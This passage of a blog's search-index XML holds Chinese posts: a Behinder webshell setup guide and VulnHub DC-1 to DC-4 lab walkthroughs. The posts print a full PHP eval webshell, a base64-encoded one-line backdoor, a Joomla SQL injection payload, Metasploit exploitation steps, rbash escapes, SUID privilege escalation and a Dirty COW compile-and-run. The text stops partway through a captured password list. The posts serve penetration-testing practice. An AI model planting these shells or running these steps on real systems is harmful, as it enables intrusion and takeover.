<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Behinder冰蝎</title>
    <url>/2022/04/28/Behinder/</url>
    <content><![CDATA[<p>最近尝试使用冰蝎这个工具，期间踩了很多坑，这里记录一下<br>冰蝎下载地址：<a href="https://github.com/rebeyond/Behinder/releases">https://github.com/rebeyond/Behinder/releases</a></p>
<p><img src="/2022/04/28/Behinder/1.png" alt="img"></p>
<p>这里我们选择zip下载，然后解压，<br>这里出现第一个坑：<br>大家可能会只装了java16，因为我们的burp抓包工具，需要用java16环境，java8不行<br>但我们的冰蝎在java16下打不开，java8可以，所以我们在这里也把java8安装一下<br><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a><br>安装完后，记录好你安装的路径<br>在冰蝎目录下建议一个文件<br>Behinder_start.bat</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> D:\Java\jdk-se8\bin //java8路径</span><br><span class="line">start javaw  -jar D:\tools\Behinder_v3.0_Beta_7\Behinder.jar //冰蝎路径</span><br></pre></td></tr></table></figure>

<p>然后我们运作这个bat就能打开冰蝎了</p>
<p><img src="/2022/04/28/Behinder/2.png" alt="img"></p>
<p>冰蝎不能用普通的一句话木马连接</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">        <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">    <span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">        <span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">              </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">                 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果要修改连接密码则将自己的密码进行md5加密然后取其前16位替换$key的值</p>
<p><img src="/2022/04/28/Behinder/3.png" alt="img"></p>
<p>连接成功</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透-DC1</title>
    <url>/2022/04/15/DC-1/</url>
    <content><![CDATA[<p>渗透环境：DC1<br>攻击机：192.168.138.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶机环境：<a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="使用nmap扫描存活的主机"><a href="#使用nmap扫描存活的主机" class="headerlink" title="使用nmap扫描存活的主机"></a>使用nmap扫描存活的主机</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap  -sP 192.168.138.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-1/1.png" alt="img"></p>
<p>192.168.178.129：目标主机</p>
<h3 id="扫描目标主机对外开放的端口"><a href="#扫描目标主机对外开放的端口" class="headerlink" title="扫描目标主机对外开放的端口"></a>扫描目标主机对外开放的端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">namp -sS -p- 192.168.178.129</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-1/2.png" alt="img"></p>
<p>发现开启了端口80<br>浏览192.168.178.129:80</p>
<p><img src="/2022/04/15/DC-1/3.png" alt="img"></p>
<p>查看Wappalyzer</p>
<p><img src="/2022/04/15/DC-1/4.png" alt="img"></p>
<p>发现cms为Drupal，这版本有点low，估计有漏洞</p>
<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>使用msf</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search drupal</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-1/5.png" alt="img"></p>
<p>这里我们选择exploit&#x2F;multi&#x2F;http&#x2F;drupal_drupageddon</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use 2</span><br><span class="line">options//查看需要设置的参数</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.178.129//设置目标ip</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>成功后我们执行ls，查看当前目录</p>
<p><img src="/2022/04/15/DC-1/6.png" alt="img"></p>
<p>发现flag1.txt，打开查看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag1.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-1/7.png" alt="img"></p>
<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>到这里，上传个一句话木马看看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">upload /data/shell.php</span><br></pre></td></tr></table></figure>

<p>用蚁剑进行连接</p>
<p><img src="/2022/04/15/DC-1/8.png" alt="img"></p>
<p>找找第二个flag在哪<br>最后发现在settings.php中</p>
<p><img src="/2022/04/15/DC-1/9.png" alt="img"></p>
<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>里面还有数据库的账号密码，也发现是mysql<br>在msf上传个交互shell, 然后连接mysql</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">mysql -u dbuser -p </span><br><span class="line">R0ck3t</span><br></pre></td></tr></table></figure>

<p>然后就常规的，查库，查表，查列，爆内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show databases; </span><br><span class="line">use drupaldb; </span><br><span class="line">show tables; </span><br><span class="line">select * from <span class="built_in">users</span>; </span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-1/10.png" alt="img"></p>
<p>这里admin的密码被加密了，我们选择update的方式改为我们知道的密码<br>其中drupal可以通过password-hash.sh生成新的密码<br>我们在www目录执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php scripts/password-hash.sh admin</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-1/11.png" alt="img"></p>
<p>sql中的替换语句</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update <span class="built_in">users</span> <span class="built_in">set</span> pass=<span class="string">&#x27;$S$DtPgSa61SbR1DXIh4wWcMft/rOmsKXcgvxTUAgenIMRbH65ZUAZu&#x27;</span> <span class="built_in">where</span> name=<span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>用账号：admin 密码：admin ，登录192.168.178.129:80查看里面信息</p>
<p><img src="/2022/04/15/DC-1/12.png" alt="img"></p>
<h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>在home目录下发现flag4.txt</p>
<p><img src="/2022/04/15/DC-1/13.png" alt="img"></p>
<h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>所以我们要提权到root，这里我们用find提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-1/14.png" alt="img"></p>
<p>发现find能利用<br>在&#x2F;tmp目录下创建command文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> <span class="built_in">command</span></span><br><span class="line">find <span class="built_in">command</span> -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-1/15.png" alt="img"></p>
<p>发现获得root权限了<br>修改命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find <span class="built_in">command</span> -<span class="built_in">exec</span> <span class="built_in">ls</span> /root \; </span><br><span class="line">find <span class="built_in">command</span> -<span class="built_in">exec</span> <span class="built_in">cat</span> /root/thefinalflag.txt \; </span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-1/16.png" alt="img"></p>
<p>到处为止DC-1完成</p>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-2</title>
    <url>/2022/04/15/DC-2/</url>
    <content><![CDATA[<p>渗透环境: DC-2  <a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a><br>攻击机：192.168.168.128<br>靶机：靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><h3 id="使用nmap扫描存活的主机"><a href="#使用nmap扫描存活的主机" class="headerlink" title="使用nmap扫描存活的主机"></a>使用nmap扫描存活的主机</h3><p>老规矩上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">namp -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-2/1.png" alt="img"></p>
<p>发现靶机IP为192.168.168.129</p>
<h3 id="扫描目标主机对外开放的端口"><a href="#扫描目标主机对外开放的端口" class="headerlink" title="扫描目标主机对外开放的端口"></a>扫描目标主机对外开放的端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">namp -sS -p- 192.168.168.129</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-2/2.png" alt="img"></p>
<p>发现开启了端口80<br>还有一个7744，这啥端口啊，对着这个端口再扫一次</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -p 7744 192.168.168.129</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-2/2.6.png" alt="img"></p>
<p>原来是ssh呢，先不管吧<br>浏览192.168.168.129:80</p>
<p><img src="/2022/04/15/DC-2/2.5.png" alt="img"></p>
<p>发现flag1</p>
<p><img src="/2022/04/15/DC-2/3.png" alt="img"></p>
<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>查看cms是什么</p>
<p><img src="/2022/04/15/DC-2/4.png" alt="img"></p>
<p>好家伙是wordpress，而且还是4.7的<br>用dirsearch看看目录下有什么</p>
<p><img src="/2022/04/15/DC-2/5.png" alt="img"></p>
<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>进入后台吧</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://dc-2/wp-login.php?redirect_to=http%3A%2F%2F192.168.168.129%2Fwp-admin%2F&amp;reauth=1</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-2/6.png" alt="img"></p>
<p>经典登录框<br>既然是WordPress，那就用wpscan看看有什么用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo wpscan --url http://dc-2/ –enumerate u </span><br></pre></td></tr></table></figure>

<p>发现以下三个user</p>
<p><img src="/2022/04/15/DC-2/7.png" alt="img"></p>
<p>放到burp上进行爆破看看，结果失败了，看来原字典中没有匹配的。<br>flag1中有说到cewl，那就用cewl生成字典再试试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl http://dc-2/ &gt; dc-2.txt</span><br></pre></td></tr></table></figure>

<p>用生成的dc-2.txt作为字典再跑一次（集束炸弹）</p>
<p><img src="/2022/04/15/DC-2/8.png" alt="img"></p>
<p>登录看看</p>
<p><img src="/2022/04/15/DC-2/9.png" alt="img"></p>
<p>flag2 get</p>
<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>这里让我们找其他突破口，看了这个wordpress没用了<br>试着上传，结果跟我说路径创不了，好吧</p>
<p>回到之前收集到的7744端口，这就是其他突破口，ssh远程连接<br>这里我用xshell连接</p>
<p><img src="/2022/04/15/DC-2/10.png" alt="img"></p>
<p>配好后用刚刚得到的两串账号密码登录看看行不行<br>我用tom的是可以的<br>进去后发现不能用很多命令，存在命令受限问题<br>ls ，vi 能用。<br>ls，发现当前目录存在flag3.txt，用vi查看</p>
<p><img src="/2022/04/15/DC-2/11.png" alt="img"></p>
<h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>我这里用了vi绕过受限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi</span><br><span class="line">:<span class="built_in">set</span> shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>

<p>发现能用cd了<br>看看有什么敏感目录吧<br>最后在&#x2F;home&#x2F;jerryx下发现flag4.txt</p>
<p><img src="/2022/04/15/DC-2/12.png" alt="img"></p>
<h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>git提权是吧<br>结果发现git不给用，还是得解决命令受限问题<br>最后找到了这种，rbash绕过<br>参考(<a href="https://xz.aliyun.com/t/7642#toc-3">https://xz.aliyun.com/t/7642#toc-3</a>)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-2/13.png" alt="img"></p>
<p>这里我们要改两个地方，其中是PATH与SHELL</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin/:/usr/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> SHELL=/bin/sh</span><br></pre></td></tr></table></figure>

<p>这样我们就能用其他命令了<br>发现tom不是sudoer，那就切成jerry</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo git -p <span class="built_in">help</span></span><br><span class="line">:!/bin/bash</span><br></pre></td></tr></table></figure>

<p>提权成功<br>查看&#x2F;root<br>发现最后的flag</p>
<p><img src="/2022/04/15/DC-2/14.png" alt="img"></p>
<p>DC2 clear</p>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-3</title>
    <url>/2022/04/16/DC-3/</url>
    <content><![CDATA[<p>渗透环境：DC3 <a href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫面存活主机"><a href="#扫面存活主机" class="headerlink" title="扫面存活主机"></a>扫面存活主机</h3><p>还是老规矩，nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/16/DC-3/1.png" alt="img"></p>
<p>发现目标主机为192.168.168.130</p>
<h3 id="扫描主机开放端口"><a href="#扫描主机开放端口" class="headerlink" title="扫描主机开放端口"></a>扫描主机开放端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -p- 192.168.168.130</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/16/DC-3/2.png" alt="img"></p>
<p>开放了80端口，浏览器打开</p>
<p><img src="/2022/04/16/DC-3/cover.png" alt="img"></p>
<h3 id="收集其他信息"><a href="#收集其他信息" class="headerlink" title="收集其他信息"></a>收集其他信息</h3><p>查看cms情况</p>
<p><img src="/2022/04/16/DC-3/3.png" alt="img"></p>
<p>是joomia<br>用dirsearch看看目录情况</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.168.130/ -e *</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/16/DC-3/4.png" alt="img"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>存在管理员后台，看看</p>
<p><img src="/2022/04/16/DC-3/5.png" alt="img"></p>
<p>经测试单纯burp爆破不开来<br>这我百度joomla存在的漏洞，发现存在sql注入漏洞，测试是否存在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://yourIP/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,database()),1)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/16/DC-3/6.png" alt="img"></p>
<p>确实是存在报错注入<br>上msf</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search joomla</span><br><span class="line">use 5</span><br><span class="line">options</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.168.130</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/16/DC-3/7.png" alt="img"></p>
<p>成功连上了</p>
<p><img src="/2022/04/16/DC-3/8.png" alt="img"></p>
<p>注：后来重做的时候发现在burp时其实已经找到密码了，不然这里用不了</p>
<p><img src="/2022/04/16/DC-3/9.png" alt="img"></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>三连问身份</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/16/DC-3/10.png" alt="img"></p>
<p>上传权限漏洞探测脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; upload ./linux-exploit-suggester-master/linux-exploit-suggester.sh &gt; /tmp/les.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>给脚本加执行权限然后执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">chmod</span> +x les.sh</span><br><span class="line">./les.sh</span><br></pre></td></tr></table></figure>

<p>发现脏牛</p>
<p><img src="/2022/04/16/DC-3/11.png" alt="img"></p>
<p>在www目录下下载脏牛提权脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/gbonacini/CVE-2016-5195.git</span><br><span class="line"><span class="built_in">cd</span> ./CVE-2016-5195                                                  </span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil //编译</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>                      //打开交互式环境        </span><br><span class="line">./dcow                                                              //执行</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/16/DC-3/12.png" alt="img"></p>
<p>OK！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo root</span><br><span class="line">dirtyCowfun</span><br><span class="line">cat /root/the-flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/16/DC-3/13.png" alt="img"></p>
<p>DC3 completed</p>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>提权</tag>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-4</title>
    <url>/2022/04/17/DC-4/</url>
    <content><![CDATA[<p>渗透环境：DC4 <a href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫面存活主机"><a href="#扫面存活主机" class="headerlink" title="扫面存活主机"></a>扫面存活主机</h3><p>还是老规矩，nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-4/1.png" alt="img"></p>
<p>发现目标主机为192.168.168.131</p>
<h3 id="扫描主机开放端口"><a href="#扫描主机开放端口" class="headerlink" title="扫描主机开放端口"></a>扫描主机开放端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.168.131</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-4/2.png" alt="img"></p>
<p>开放了80端口和22端口，浏览器打开</p>
<p><img src="/2022/04/17/DC-4/cover.png" alt="img"></p>
<h3 id="收集其他信息"><a href="#收集其他信息" class="headerlink" title="收集其他信息"></a>收集其他信息</h3><p>用dirsearch看看目录情况</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.168.130/ -e *</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-4/3.png" alt="img"></p>
<p>有个command.php，应该是远程命令执行了</p>
<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>显示用burp进行爆破</p>
<p><img src="/2022/04/17/DC-4/4.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">账号：admin</span><br><span class="line">密码：happy</span><br></pre></td></tr></table></figure>

<p>登录进去</p>
<p><img src="/2022/04/17/DC-4/5.png" alt="img"></p>
<p>确实是命令执行<br>抓包<br>修改上传参数<br>上一个base64木马上去</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydMMWFuZyddKTs/Pg== &quot;</span>|<span class="built_in">base64</span> -d &gt; shell.php</span><br></pre></td></tr></table></figure>

<p>上传成功</p>
<p><img src="/2022/04/17/DC-4/6.png" alt="img"></p>
<p>蚁剑连接</p>
<p><img src="/2022/04/17/DC-4/7.png" alt="img"></p>
<p>查看&#x2F;home下有什么内容<br>在&#x2F;home&#x2F;jim&#x2F;backups&#x2F;old-passwords.bak下找到了旧密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">000000</span><br><span class="line">12345</span><br><span class="line">iloveyou</span><br><span class="line">1q2w3e4r5t</span><br><span class="line">1234</span><br><span class="line">123456a</span><br><span class="line">qwertyuiop</span><br><span class="line">monkey</span><br><span class="line">123321</span><br><span class="line">dragon</span><br><span class="line">654321</span><br><span class="line">666666</span><br><span class="line">123</span><br><span class="line">myspace1</span><br><span class="line">a123456</span><br><span class="line">121212</span><br><span class="line">1qaz2wsx</span><br><span class="line">123qwe</span><br><span class="line">123abc</span><br><span class="line">tinkle</span><br><span class="line">target123</span><br><span class="line">gwerty</span><br><span class="line">1g2w3e4r</span><br><span class="line">gwerty123</span><br><span class="line">zag12wsx</span><br><span class="line">7777777</span><br><span class="line">qwerty1</span><br><span class="line">1q2w3e4r</span><br><span class="line">987654321</span><br><span class="line">222222</span><br><span class="line">qwe123</span><br><span class="line">qwerty123</span><br><span class="line">zxcvbnm</span><br><span class="line">555555</span><br><span class="line">112233</span><br><span class="line">fuckyou</span><br><span class="line">asdfghjkl</span><br><span class="line">12345a</span><br><span class="line">123123123</span><br><span class="line">1q2w3e</span><br><span class="line">qazwsx</span><br><span class="line">loveme1</span><br><span class="line">juventus</span><br><span class="line">jennifer1</span><br><span class="line">!~!1</span><br><span class="line">bubbles</span><br><span class="line">samuel</span><br><span class="line">fuckoff</span><br><span class="line">lovers</span><br><span class="line">cheese1</span><br><span class="line">0123456</span><br><span class="line">123asd</span><br><span class="line">999999999</span><br><span class="line">madison</span><br><span class="line">elizabeth1</span><br><span class="line">music</span><br><span class="line">buster1</span><br><span class="line">lauren</span><br><span class="line">david1</span><br><span class="line">tigger1</span><br><span class="line">123qweasd</span><br><span class="line">taylor1</span><br><span class="line">carlos</span><br><span class="line">tinkerbell</span><br><span class="line">samantha1</span><br><span class="line">Sojdlg123aljg</span><br><span class="line">joshua1</span><br><span class="line">poop</span><br><span class="line">stella</span><br><span class="line">myspace123</span><br><span class="line">asdasd5</span><br><span class="line">freedom1</span><br><span class="line">whatever1</span><br><span class="line">xxxxxx</span><br><span class="line">00000</span><br><span class="line">valentina</span><br><span class="line">a1b2c3</span><br><span class="line">741852963</span><br><span class="line">austin</span><br><span class="line">monica</span><br><span class="line">qaz123</span><br><span class="line">lovely1</span><br><span class="line">music1</span><br><span class="line">harley1</span><br><span class="line">family1</span><br><span class="line">spongebob1</span><br><span class="line">steven</span><br><span class="line">nirvana</span><br><span class="line">1234abcd</span><br><span class="line">hellokitty</span><br><span class="line">thomas1</span><br><span class="line">cooper</span><br><span class="line">520520</span><br><span class="line">muffin</span><br><span class="line">christian1</span><br><span class="line">love13</span><br><span class="line">fucku2</span><br><span class="line">arsenal1</span><br><span class="line">lucky7</span><br><span class="line">diablo</span><br><span class="line">apples</span><br><span class="line">george1</span><br><span class="line">babyboy1</span><br><span class="line">crystal</span><br><span class="line">1122334455</span><br><span class="line">player1</span><br><span class="line">aa123456</span><br><span class="line">vfhbyf</span><br><span class="line">forever1</span><br><span class="line">Password</span><br><span class="line">winston</span><br><span class="line">chivas1</span><br><span class="line">sexy</span><br><span class="line">hockey1</span><br><span class="line">1a2b3c4d</span><br><span class="line">pussy</span><br><span class="line">playboy1</span><br><span class="line">stalker</span><br><span class="line">cherry</span><br><span class="line">tweety</span><br><span class="line">toyota</span><br><span class="line">creative</span><br><span class="line">gemini</span><br><span class="line">pretty1</span><br><span class="line">maverick</span><br><span class="line">brittany1</span><br><span class="line">nathan1</span><br><span class="line">letmein1</span><br><span class="line">cameron1</span><br><span class="line">secret1</span><br><span class="line">google1</span><br><span class="line">heaven</span><br><span class="line">martina</span><br><span class="line">murphy</span><br><span class="line">spongebob</span><br><span class="line">uQA9Ebw445</span><br><span class="line">fernando</span><br><span class="line">pretty</span><br><span class="line">startfinding</span><br><span class="line">softball</span><br><span class="line">dolphin1</span><br><span class="line">fuckme</span><br><span class="line">test123</span><br><span class="line">qwerty1234</span><br><span class="line">kobe24</span><br><span class="line">alejandro</span><br><span class="line">adrian</span><br><span class="line">september</span><br><span class="line">aaaaaa1</span><br><span class="line">bubba1</span><br><span class="line">isabella</span><br><span class="line">abc123456</span><br><span class="line">password3</span><br><span class="line">jason1</span><br><span class="line">abcdefg123</span><br><span class="line">loveyou1</span><br><span class="line">shannon</span><br><span class="line">100200</span><br><span class="line">manuel</span><br><span class="line">leonardo</span><br><span class="line">molly1</span><br><span class="line">flowers</span><br><span class="line">123456z</span><br><span class="line">007007</span><br><span class="line">password.</span><br><span class="line">321321</span><br><span class="line">miguel</span><br><span class="line">samsung1</span><br><span class="line">sergey</span><br><span class="line">sweet1</span><br><span class="line">abc1234</span><br><span class="line">windows</span><br><span class="line">qwert123</span><br><span class="line">vfrcbv</span><br><span class="line">poohbear</span><br><span class="line">d123456</span><br><span class="line">school1</span><br><span class="line">badboy</span><br><span class="line">951753</span><br><span class="line">123456c</span><br><span class="line">111</span><br><span class="line">steven1</span><br><span class="line">snoopy1</span><br><span class="line">garfield</span><br><span class="line">YAgjecc826</span><br><span class="line">compaq</span><br><span class="line">candy1</span><br><span class="line">sarah1</span><br><span class="line">qwerty123456</span><br><span class="line">123456l</span><br><span class="line">eminem1</span><br><span class="line">141414</span><br><span class="line">789789</span><br><span class="line">maria</span><br><span class="line">steelers</span><br><span class="line">iloveme1</span><br><span class="line">morgan1</span><br><span 